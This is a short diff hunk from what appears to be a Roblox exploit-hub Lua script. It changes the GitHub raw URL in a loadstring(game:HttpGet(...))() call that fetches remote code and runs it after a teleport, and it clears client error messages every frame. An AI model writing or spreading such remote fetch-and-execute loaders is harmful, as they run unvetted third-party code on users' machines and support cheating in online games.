@@ -27,7 +27,7 @@
                     game:GetService("RunService").RenderStepped:Connect(function()
                         game:GetService("GuiService"):ClearError()
                     end)
-                    loadstring(game:HttpGet(("https://raw.githubusercontent.com/richfloppa/rich-hub/main/rich-hub-testing-server")))()
+                    loadstring(game:HttpGet(("https://raw.githubusercontent.com/Xingtaiduan/Script/main/test.txt")))()
                 ]])
             end
             game:GetService("TeleportService"):Teleport(game.PlaceId)
